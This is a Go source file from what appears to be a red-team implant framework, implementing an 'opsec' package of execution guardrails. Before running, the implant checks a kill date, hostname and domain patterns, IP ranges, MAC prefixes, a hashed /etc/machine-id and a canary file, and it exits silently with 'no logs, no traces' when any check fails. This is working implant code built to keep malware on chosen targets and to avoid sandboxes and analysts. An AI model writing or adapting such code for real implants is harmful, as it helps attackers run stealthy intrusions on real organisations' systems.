package opsec

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"net"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// GuardrailConfig mirrors the guardrail fields from config.ImplantConfig
// into a dedicated struct for use within the opsec package.
type GuardrailConfig struct {
	HostnamePattern string   // regex pattern hostname must match
	AllowedCIDRs    []string // CIDR ranges the host IP must be in
	RequiredMACs    []string // MAC address prefixes that must exist
	MachineIDHash   string   // SHA-256 hash of /etc/machine-id (don't store plaintext)
	CanaryFile      string   // file path that must exist on target
	CanaryHash      string   // SHA-256 hash of canary file contents
	KillDate        string   // "2026-06-01" — implant expires after this date
	DomainPattern   string   // regex pattern that DNS domain must match
}

// GuardrailConfigFromImplant extracts guardrail settings from the main
// ImplantConfig into a dedicated GuardrailConfig. This avoids circular
// imports while keeping the config package as the single source of truth.
func GuardrailConfigFromImplant(cfg *config.ImplantConfig) *GuardrailConfig {
	return &GuardrailConfig{
		HostnamePattern: cfg.HostnamePattern,
		AllowedCIDRs:    cfg.AllowedCIDRs,
		RequiredMACs:    cfg.RequiredMACs,
		MachineIDHash:   cfg.MachineIDHash,
		CanaryFile:      cfg.CanaryFile,
		CanaryHash:      cfg.CanaryHash,
		KillDate:        cfg.KillDate,
		DomainPattern:   cfg.DomainPattern,
	}
}

// DefaultGuardrails returns a GuardrailConfig with only a kill date set
// (30 days from now). All other fields are left empty and will be skipped
// during enforcement.
func DefaultGuardrails() *GuardrailConfig {
	return &GuardrailConfig{
		KillDate: time.Now().AddDate(0, 0, 30).Format("2006-01-02"),
	}
}

// CheckGuardrails evaluates all configured guardrail checks against the
// current host environment. Empty/zero-value fields are skipped. Returns
// (true, "") if all checks pass, or (false, reason) on the first failure.
func CheckGuardrails(cfg *GuardrailConfig) (bool, string) {
	if cfg == nil {
		return true, ""
	}

	if cfg.KillDate != "" {
		if pass, reason := checkKillDate(cfg.KillDate); !pass {
			return false, reason
		}
	}

	if cfg.HostnamePattern != "" {
		if pass, reason := checkHostname(cfg.HostnamePattern); !pass {
			return false, reason
		}
	}

	if len(cfg.AllowedCIDRs) > 0 {
		if pass, reason := checkIPRange(cfg.AllowedCIDRs); !pass {
			return false, reason
		}
	}

	if len(cfg.RequiredMACs) > 0 {
		if pass, reason := checkMAC(cfg.RequiredMACs); !pass {
			return false, reason
		}
	}

	if cfg.MachineIDHash != "" {
		if pass, reason := checkMachineID(cfg.MachineIDHash); !pass {
			return false, reason
		}
	}

	if cfg.CanaryFile != "" {
		if pass, reason := checkCanaryFile(cfg.CanaryFile, cfg.CanaryHash); !pass {
			return false, reason
		}
	}

	if cfg.DomainPattern != "" {
		if pass, reason := checkDomain(cfg.DomainPattern); !pass {
			return false, reason
		}
	}

	return true, ""
}

// EnforceGuardrails runs CheckGuardrails and silently exits the process
// if any check fails. No error output, no logs, no traces.
func EnforceGuardrails(cfg *GuardrailConfig) {
	if pass, _ := CheckGuardrails(cfg); !pass {
		os.Exit(0)
	}
}

// checkHostname verifies that the system hostname matches the given regex.
func checkHostname(pattern string) (bool, string) {
	hostname, err := os.Hostname()
	if err != nil {
		return false, "hostname unavailable"
	}

	re, err := regexp.Compile(pattern)
	if err != nil {
		return false, "invalid hostname pattern"
	}

	if !re.MatchString(hostname) {
		return false, "hostname mismatch"
	}
	return true, ""
}

// checkIPRange verifies that at least one host IP address falls within
// one of the provided CIDR ranges.
func checkIPRange(cidrs []string) (bool, string) {
	// Parse all CIDR networks up front.
	var networks []*net.IPNet
	for _, cidr := range cidrs {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		networks = append(networks, ipNet)
	}

	if len(networks) == 0 {
		return false, "no valid CIDR ranges configured"
	}

	ifaces, err := net.Interfaces()
	if err != nil {
		return false, "cannot enumerate interfaces"
	}

	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		if iface.Flags&net.FlagUp == 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil {
				continue
			}

			for _, network := range networks {
				if network.Contains(ip) {
					return true, ""
				}
			}
		}
	}

	return false, "no host IP in allowed CIDR ranges"
}

// checkMAC verifies that at least one network interface has a MAC address
// that starts with one of the given prefixes (case-insensitive).
func checkMAC(prefixes []string) (bool, string) {
	ifaces, err := net.Interfaces()
	if err != nil {
		return false, "cannot enumerate interfaces"
	}

	for _, iface := range ifaces {
		mac := strings.ToLower(iface.HardwareAddr.String())
		if mac == "" {
			continue
		}

		for _, prefix := range prefixes {
			if strings.HasPrefix(mac, strings.ToLower(prefix)) {
				return true, ""
			}
		}
	}

	return false, "no matching MAC address prefix"
}

// checkMachineID reads /etc/machine-id, computes its SHA-256 hash, and
// compares against the expected hash. The plaintext machine-id is never
// stored in the binary configuration.
func checkMachineID(expectedHash string) (bool, string) {
	data, err := os.ReadFile("/etc/machine-id")
	if err != nil {
		return false, "machine-id unavailable"
	}

	// machine-id typically has a trailing newline; trim it.
	content := strings.TrimSpace(string(data))
	hash := sha256.Sum256([]byte(content))
	hexHash := hex.EncodeToString(hash[:])

	if !strings.EqualFold(hexHash, expectedHash) {
		return false, "machine-id mismatch"
	}
	return true, ""
}

// checkCanaryFile verifies that the specified file exists on the target.
// If a content hash is provided, the file contents must also match.
func checkCanaryFile(path string, contentHash string) (bool, string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return false, "canary file missing"
	}

	if contentHash != "" {
		hash := sha256.Sum256(data)
		hexHash := hex.EncodeToString(hash[:])
		if !strings.EqualFold(hexHash, contentHash) {
			return false, "canary file hash mismatch"
		}
	}

	return true, ""
}

// checkKillDate verifies that the current date is before the configured
// expiration date. The date format is "2006-01-02" (YYYY-MM-DD).
func checkKillDate(dateStr string) (bool, string) {
	killDate, err := time.Parse("2006-01-02", dateStr)
	if err != nil {
		// If the date can't be parsed, fail closed (safe side).
		return false, "invalid kill date format"
	}

	// Set kill date to end-of-day (23:59:59) so the implant runs through
	// the entire final day.
	killDate = killDate.Add(24*time.Hour - time.Second)

	if time.Now().After(killDate) {
		return false, "kill date exceeded"
	}
	return true, ""
}

// checkDomain verifies that the host's DNS domain matches the given regex.
// It tries multiple sources: /etc/resolv.conf search/domain directives,
// then falls back to extracting the domain from the FQDN hostname.
func checkDomain(pattern string) (bool, string) {
	re, err := regexp.Compile(pattern)
	if err != nil {
		return false, "invalid domain pattern"
	}

	// Strategy 1: Parse /etc/resolv.conf for search or domain directives.
	domains := getResolvConfDomains()

	// Strategy 2: Extract domain from FQDN hostname (everything after first dot).
	hostname, err := os.Hostname()
	if err == nil {
		if idx := strings.Index(hostname, "."); idx >= 0 {
			domains = append(domains, hostname[idx+1:])
		}
	}

	for _, domain := range domains {
		if re.MatchString(domain) {
			return true, ""
		}
	}

	return false, "domain mismatch"
}

// getResolvConfDomains parses /etc/resolv.conf and returns all domain
// values from "domain" and "search" directives.
func getResolvConfDomains() []string {
	f, err := os.Open("/etc/resolv.conf")
	if err != nil {
		return nil
	}
	defer f.Close()

	var domains []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "#") {
			continue
		}

		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		switch fields[0] {
		case "domain":
			domains = append(domains, fields[1])
		case "search":
			// search directive can list multiple domains.
			domains = append(domains, fields[1:]...)
		}
	}

	return domains
}
